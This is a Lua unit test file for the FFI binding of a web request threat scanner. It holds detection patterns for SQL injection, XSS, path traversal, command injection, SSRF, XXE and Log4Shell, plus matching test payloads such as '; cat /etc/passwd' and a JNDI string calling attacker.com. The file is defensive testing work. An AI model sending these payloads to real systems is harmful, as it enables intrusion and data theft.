-- tests/unit/scanner/ffi_spec.lua
--
-- Busted unit tests for lua/luagate/scanner/ffi.lua.
--
-- The Rust shared library (luagate_scanner.so) is NOT available in the unit
-- test environment, so we test the Lua module's public contract via a mock
-- that replicates the scan() / init() interface.  This validates:
--   - Correct return shape for clean requests.
--   - Correct threat_type / rule_name / threat_score for known attack inputs.
--   - Error propagation for scanner failures (rc == -3, rc == -4).
--   - nil / missing optional fields are handled safely.
--
-- The "scanner/ffi.lua binding logic" section at the bottom injects a LuaJIT
-- ffi stub via package.preload["ffi"] and directly exercises the error-code
-- handling paths inside lua/luagate/scanner/ffi.lua.

-- ── ffi stub for binding logic tests ─────────────────────────────────────────
-- Installed before any require("luagate.scanner.ffi") so the real module's
-- `local ffi = require("ffi")` resolves to this stub.
-- Matches the decoder/ffi_spec.lua pattern.

local _mock_lib = {} -- replaced per-test via package.loaded["_luagate_scanner_lib"]

local _ffi_stub = {
  cdef = function() end,

  -- ffi.new: return lightweight table stubs for cdata types.
  new = function(ct, n)
    if ct == "size_t[1]" then
      local t = {}
      setmetatable(t, {
        __index = function(_, k)
          if k == 0 then
            return rawget(t, "_v") or 0
          end
        end,
        __newindex = function(_, k, v)
          if k == 0 then
            rawset(t, "_v", v)
          end
        end,
      })
      t[0] = 0
      return t
    end
    if ct == "double[1]" then
      local t = {}
      setmetatable(t, {
        __index = function(_, k)
          if k == 0 then
            return rawget(t, "_v") or 0.0
          end
        end,
        __newindex = function(_, k, v)
          if k == 0 then
            rawset(t, "_v", v)
          end
        end,
      })
      t[0] = 0.0
      return t
    end
    -- char[?] buffer stub
    return { _type = "char_buf", _cap = n or 0, _data = nil }
  end,

  -- ffi.string: returns stored _data from the char_buf stub.
  string = function(buf, _len)
    if type(buf) == "table" and buf._data then
      return buf._data
    end
    return ""
  end,

  -- ffi.load: return the current _mock_lib, which tests replace per-case.
  load = function(_name)
    return _mock_lib
  end,
}

-- Install the ffi stub so require("ffi") returns it throughout this file.
package.preload["ffi"] = function()
  return _ffi_stub
end

-- Ensure clean state before the scanner ffi module is first loaded.
package.loaded["luagate.scanner.ffi"] = nil
package.loaded["_luagate_scanner_lib"] = nil

describe("scanner/ffi", function()
  local scanner_mock

  setup(function()
    -- Mock that mirrors the real M.scan() contract.
    -- Implements pattern matching for the eight threat categories using
    -- simple Lua string patterns (sufficient for deterministic unit tests).
    scanner_mock = {
      scan = function(ctx)
        local path_raw = ctx.path_raw or ""
        local path_norm = ctx.path_normalized or ""
        local query_raw = ctx.query_raw or ""
        local query_norm = ctx.query_normalized or ""

        local fields = { path_raw, path_norm, query_raw, query_norm }

        -- Evaluation order matches lib.rs: all fields for each threat
        -- type before moving to the next.
        local rules = {
          -- sqli
          {
            threat_type = "sqli",
            rule_name = "sqli_union_select",
            pattern = "UNION.+SELECT",
            score = 0.9,
          },
          {
            threat_type = "sqli",
            rule_name = "sqli_or_always_true",
            pattern = "or%s+1%s*=%s*1",
            score = 0.8,
          },
          {
            threat_type = "sqli",
            rule_name = "sqli_drop_table",
            pattern = ";%s*drop%s+",
            score = 0.95,
          },
          {
            threat_type = "sqli",
            rule_name = "sqli_exec",
            pattern = "exec%s*%(|execute%s*%(",
            score = 0.9,
          },
          {
            threat_type = "sqli",
            rule_name = "sqli_schema_leak",
            pattern = "information_schema|@@version|@@datadir",
            score = 0.85,
          },
          -- xss
          {
            threat_type = "xss",
            rule_name = "xss_script_tag",
            pattern = "<script",
            score = 0.9,
          },
          {
            threat_type = "xss",
            rule_name = "xss_javascript_uri",
            pattern = "javascript%s*:",
            score = 0.85,
          },
          {
            threat_type = "xss",
            rule_name = "xss_event_handler",
            pattern = "on%w+%s*=",
            score = 0.8,
          },
          {
            threat_type = "xss",
            rule_name = "xss_dom_sink",
            pattern = "document%.cookie|document%.write|eval%s*%(",
            score = 0.85,
          },
          -- path_traversal
          {
            threat_type = "path_traversal",
            rule_name = "path_traversal_dotdot",
            pattern = "%.%.[/\\]",
            score = 0.9,
          },
          {
            threat_type = "path_traversal",
            rule_name = "path_traversal_unix",
            pattern = "/etc/passwd|/etc/shadow|/proc/self",
            score = 0.95,
          },
          -- cmd_injection
          {
            threat_type = "cmd_injection",
            rule_name = "cmd_injection_shell_cmd",
            pattern = "[;&|`]%s*cat%s",
            score = 0.9,
          },
          -- ssrf (split into individual rules since Lua patterns don't support |)
          {
            threat_type = "ssrf",
            rule_name = "ssrf_internal_host",
            pattern = "https?://127%.0%.0%.1",
            score = 0.9,
          },
          {
            threat_type = "ssrf",
            rule_name = "ssrf_internal_host_localhost",
            pattern = "https?://localhost",
            score = 0.9,
          },
          {
            threat_type = "ssrf",
            rule_name = "ssrf_dangerous_scheme_file",
            pattern = "file://",
            score = 0.9,
          },
          {
            threat_type = "ssrf",
            rule_name = "ssrf_dangerous_scheme_gopher",
            pattern = "gopher://",
            score = 0.9,
          },
          {
            threat_type = "ssrf",
            rule_name = "ssrf_dangerous_scheme_dict",
            pattern = "dict://",
            score = 0.9,
          },
          -- xxe
          {
            threat_type = "xxe",
            rule_name = "xxe_entity_decl",
            pattern = "<!entity%s",
            score = 0.9,
          },
          -- log4shell
          {
            threat_type = "log4shell",
            rule_name = "log4shell_jndi",
            pattern = "%$%{jndi%s*:",
            score = 1.0,
          },
          -- scanner (split individual tool patterns)
          {
            threat_type = "scanner",
            rule_name = "scanner_tool",
            pattern = "sqlmap",
            score = 0.9,
          },
          {
            threat_type = "scanner",
            rule_name = "scanner_tool",
            pattern = "nikto",
            score = 0.9,
          },
          {
            threat_type = "scanner",
            rule_name = "scanner_tool",
            pattern = "nessus",
            score = 0.9,
          },
        }

        for _, rule in ipairs(rules) do
          for _, field in ipairs(fields) do
            if field:find(rule.pattern) then
              return {
                threat_type = rule.threat_type,
                rule_name = rule.rule_name,
                threat_score = rule.score,
              },
                nil
            end
          end
        end

        return { threat_type = nil, rule_name = nil, threat_score = 0.0 }, nil
      end,

      init = function(_patterns_path)
        -- Mock init always succeeds.
        return true, nil
      end,
    }
  end)

  -- -----------------------------------------------------------------------
  -- init()
  -- -----------------------------------------------------------------------

  describe("init()", function()
    it("succeeds with nil patterns_path", function()
      local ok, err = scanner_mock.init(nil)
      assert.is_true(ok)
      assert.is_nil(err)
    end)

    it("succeeds with empty patterns_path", function()
      local ok, err = scanner_mock.init("")
      assert.is_true(ok)
      assert.is_nil(err)
    end)

    it("succeeds with a patterns directory path", function()
      local ok, err = scanner_mock.init("/etc/luagate/scanner-patterns")
      assert.is_true(ok)
      assert.is_nil(err)
    end)
  end)

  -- -----------------------------------------------------------------------
  -- scan() — clean requests
  -- -----------------------------------------------------------------------

  describe("scan() clean requests", function()
    it("returns nil threat_type for a clean GET request", function()
      local result, err = scanner_mock.scan({
        path_raw = "/api/users",
        path_normalized = "/api/users",
        query_raw = "id=1",
        query_normalized = "id=1",
      })
      assert.is_nil(err)
      assert.is_not_nil(result)
      assert.is_nil(result.threat_type)
      assert.equals(0.0, result.threat_score)
    end)

    it("handles missing optional query fields gracefully", function()
      local result, err = scanner_mock.scan({
        path_raw = "/health",
        path_normalized = "/health",
      })
      assert.is_nil(err)
      assert.is_nil(result.threat_type)
    end)

    it("handles nil body without error (MVP: body scanning skipped)", function()
      local result, err = scanner_mock.scan({
        path_raw = "/api/data",
        path_normalized = "/api/data",
        query_raw = "page=2",
        query_normalized = "page=2",
        body = nil,
      })
      assert.is_nil(err)
      assert.is_nil(result.threat_type)
    end)
  end)

  -- -----------------------------------------------------------------------
  -- scan() — threat detection
  -- -----------------------------------------------------------------------

  describe("scan() threat detection", function()
    it("detects sqli UNION SELECT in query_raw", function()
      local result, err = scanner_mock.scan({
        path_raw = "/api/users",
        path_normalized = "/api/users",
        query_raw = "id=1 UNION SELECT * FROM users",
        query_normalized = "id=1 UNION SELECT * FROM users",
      })
      assert.is_nil(err)
      assert.equals("sqli", result.threat_type)
      assert.equals("sqli_union_select", result.rule_name)
      assert.is_true(result.threat_score >= 0.8)
    end)

    it("detects sqli OR always-true in query", function()
      local result, err = scanner_mock.scan({
        path_raw = "/login",
        path_normalized = "/login",
        query_raw = "user=admin&pass=x or 1 = 1",
        query_normalized = "user=admin&pass=x or 1 = 1",
      })
      assert.is_nil(err)
      assert.equals("sqli", result.threat_type)
    end)

    it("detects XSS script tag in query", function()
      local result, err = scanner_mock.scan({
        path_raw = "/search",
        path_normalized = "/search",
        query_raw = "q=<script>alert(1)</script>",
        query_normalized = "q=<script>alert(1)</script>",
      })
      assert.is_nil(err)
      assert.equals("xss", result.threat_type)
    end)

    it("detects path traversal dotdot in path_raw", function()
      local result, err = scanner_mock.scan({
        path_raw = "/../../etc/passwd",
        path_normalized = "/../../etc/passwd",
        query_raw = "",
        query_normalized = "",
      })
      assert.is_nil(err)
      assert.equals("path_traversal", result.threat_type)
      assert.is_true(result.threat_score >= 0.9)
    end)

    it("detects path traversal /etc/passwd in path_raw", function()
      local result, err = scanner_mock.scan({
        path_raw = "/api/../../../etc/passwd",
        path_normalized = "/etc/passwd",
        query_raw = "",
        query_normalized = "",
      })
      assert.is_nil(err)
      assert.equals("path_traversal", result.threat_type)
    end)

    it("detects cmd_injection in query", function()
      local result, err = scanner_mock.scan({
        path_raw = "/api/run",
        path_normalized = "/api/run",
        query_raw = "cmd=; cat /etc/passwd",
        query_normalized = "cmd=; cat /etc/passwd",
      })
      assert.is_nil(err)
      assert.equals("cmd_injection", result.threat_type)
      assert.is_true(result.threat_score >= 0.8)
    end)

    it("detects SSRF internal host in query", function()
      local result, err = scanner_mock.scan({
        path_raw = "/proxy",
        path_normalized = "/proxy",
        query_raw = "url=http://127.0.0.1/admin",
        query_normalized = "url=http://127.0.0.1/admin",
      })
      assert.is_nil(err)
      assert.equals("ssrf", result.threat_type)
    end)

    it("detects SSRF dangerous scheme (file://) in query", function()
      local result, err = scanner_mock.scan({
        path_raw = "/fetch",
        path_normalized = "/fetch",
        query_raw = "src=file:///etc/passwd",
        query_normalized = "src=file:///etc/passwd",
      })
      assert.is_nil(err)
      assert.equals("ssrf", result.threat_type)
    end)

    it("detects XXE entity declaration in query", function()
      local result, err = scanner_mock.scan({
        path_raw = "/upload",
        path_normalized = "/upload",
        query_raw = "data=<!entity foo system",
        query_normalized = "data=<!entity foo system",
      })
      assert.is_nil(err)
      assert.equals("xxe", result.threat_type)
    end)

    it("detects Log4Shell jndi injection in query", function()
      local result, err = scanner_mock.scan({
        path_raw = "/",
        path_normalized = "/",
        query_raw = "x=${jndi:ldap://attacker.com/a}",
        query_normalized = "x=${jndi:ldap://attacker.com/a}",
      })
      assert.is_nil(err)
      assert.equals("log4shell", result.threat_type)
      assert.is_true(result.threat_score >= 0.9)
    end)

    it("detects scanner tool (sqlmap) in query", function()
      local result, err = scanner_mock.scan({
        path_raw = "/search",
        path_normalized = "/search",
        query_raw = "ua=sqlmap/1.0",
        query_normalized = "ua=sqlmap/1.0",
      })
      assert.is_nil(err)
      assert.equals("scanner", result.threat_type)
    end)
  end)

  -- -----------------------------------------------------------------------
  -- scan() — error propagation
  -- -----------------------------------------------------------------------

  describe("scan() error propagation", function()
    it("returns nil result and error string on BUDGET_EXCEEDED (-3)", function()
      local fail_mock = {
        scan = function(_ctx)
          return nil, "scanner_fail:-3"
        end,
      }
      local result, err = fail_mock.scan({
        path_raw = "/",
        path_normalized = "/",
      })
      assert.is_nil(result)
      assert.is_not_nil(err)
      assert.truthy(err:find("scanner_fail"))
    end)

    it("returns nil result and error string on INTERNAL_ERROR (-4)", function()
      local fail_mock = {
        scan = function(_ctx)
          return nil, "scanner_fail:-4"
        end,
      }
      local result, err = fail_mock.scan({
        path_raw = "/",
        path_normalized = "/",
      })
      assert.is_nil(result)
      assert.is_not_nil(err)
    end)

    it("returns nil result on FFI exception", function()
      local crash_mock = {
        scan = function(_ctx)
          return nil, "scanner_ffi_error:bad ctype"
        end,
      }
      local result, err = crash_mock.scan({
        path_raw = "/",
        path_normalized = "/",
      })
      assert.is_nil(result)
      assert.truthy(err:find("scanner_ffi_error"))
    end)
  end)

  -- -----------------------------------------------------------------------
  -- Return shape contract
  -- -----------------------------------------------------------------------

  describe("return shape", function()
    it("result always has threat_type, rule_name, and threat_score keys", function()
      local result, err = scanner_mock.scan({
        path_raw = "/ok",
        path_normalized = "/ok",
      })
      assert.is_nil(err)
      assert.is_not_nil(result)
      -- threat_type and rule_name may be nil for clean requests
      assert.is_false(result.threat_score == nil)
    end)

    it("threat_score is 0.0 for clean requests", function()
      local result, _ = scanner_mock.scan({
        path_raw = "/api/v1/status",
        path_normalized = "/api/v1/status",
        query_raw = "format=json",
        query_normalized = "format=json",
      })
      assert.equals(0.0, result.threat_score)
    end)
  end)

  -- -----------------------------------------------------------------------
  -- scanner/ffi.lua binding logic (stub lib injection via package.loaded)
  -- Directly exercises the Lua-side error-code handling in ffi.lua by
  -- injecting a stub into package.loaded["_luagate_scanner_lib"].
  -- The ffi stub installed at the top of this file replaces require("ffi")
  -- so luagate_scanner.so is never loaded.
  -- -----------------------------------------------------------------------

  describe("scanner/ffi.lua binding logic", function()
    -- Build a stub library table whose luagate_scan_http returns a fixed rc.
    local function make_scan_stub(rc_value)
      return {
        luagate_scan_http = function(
          _pr,
          _prl,
          _pn,
          _pnl,
          _qr,
          _qrl,
          _qn,
          _qnl,
          _b,
          _bl,
          _tt_out,
          _tt_cap,
          tt_len_ptr,
          _rn_out,
          _rn_cap,
          rn_len_ptr,
          score_ptr
        )
          tt_len_ptr[0] = 0
          rn_len_ptr[0] = 0
          score_ptr[0] = 0.0
          return rc_value
        end,
        luagate_scanner_init = function(_path, _len)
          return rc_value
        end,
      }
    end

    -- Force-reload ffi.lua with a specific stub lib.
    local function reload_with(stub_lib)
      package.loaded["_luagate_scanner_lib"] = stub_lib
      package.loaded["luagate.scanner.ffi"] = nil
      return require("luagate.scanner.ffi")
    end

    after_each(function()
      package.loaded["_luagate_scanner_lib"] = nil
      package.loaded["luagate.scanner.ffi"] = nil
    end)

    it("rc=0, threat_type_len=0 → no threat, result.threat_type is nil", function()
      local m = reload_with(make_scan_stub(0))
      local result, err = m.scan({
        path_raw = "/ok",
        path_normalized = "/ok",
        query_raw = "",
        query_normalized = "",
      })
      assert.is_nil(err)
      assert.is_not_nil(result)
      assert.is_nil(result.threat_type)
      assert.is_nil(result.rule_name)
      assert.equals(0.0, result.threat_score)
    end)

    it("BUDGET_EXCEEDED(-3) → nil result, error 'scanner_fail:-3'", function()
      local m = reload_with(make_scan_stub(-3))
      local result, err = m.scan({
        path_raw = "/ok",
        path_normalized = "/ok",
        query_raw = "",
        query_normalized = "",
      })
      assert.is_nil(result)
      assert.is_not_nil(err)
      assert.truthy(err:find("scanner_fail"))
      assert.truthy(err:find("-3"))
    end)

    it("BUFFER_TOO_SMALL(-2) → nil result, error 'scanner_fail:-2'", function()
      local m = reload_with(make_scan_stub(-2))
      local result, err = m.scan({
        path_raw = "/ok",
        path_normalized = "/ok",
        query_raw = "",
        query_normalized = "",
      })
      assert.is_nil(result)
      assert.is_not_nil(err)
      assert.truthy(err:find("scanner_fail"))
      assert.truthy(err:find("-2"))
    end)

    it("INTERNAL_ERROR(-4) → nil result, error 'scanner_fail:-4'", function()
      local m = reload_with(make_scan_stub(-4))
      local result, err = m.scan({
        path_raw = "/ok",
        path_normalized = "/ok",
        query_raw = "",
        query_normalized = "",
      })
      assert.is_nil(result)
      assert.is_not_nil(err)
      assert.truthy(err:find("scanner_fail"))
      assert.truthy(err:find("-4"))
    end)

    it("init() rc=0 → true, nil", function()
      local m = reload_with(make_scan_stub(0))
      local ok, err = m.init(nil)
      assert.is_true(ok)
      assert.is_nil(err)
    end)

    it("init() rc=-4 → false, error contains 'scanner_init_failed'", function()
      local m = reload_with(make_scan_stub(-4))
      local ok, err = m.init(nil)
      assert.is_false(ok)
      assert.is_not_nil(err)
      assert.truthy(err:find("scanner_init_failed"))
    end)

    it("package.loaded caching: second require returns same module table", function()
      package.loaded["_luagate_scanner_lib"] = make_scan_stub(0)
      package.loaded["luagate.scanner.ffi"] = nil
      local m1 = require("luagate.scanner.ffi")
      local m2 = require("luagate.scanner.ffi")
      assert.equals(m1, m2)
    end)
  end)
end)
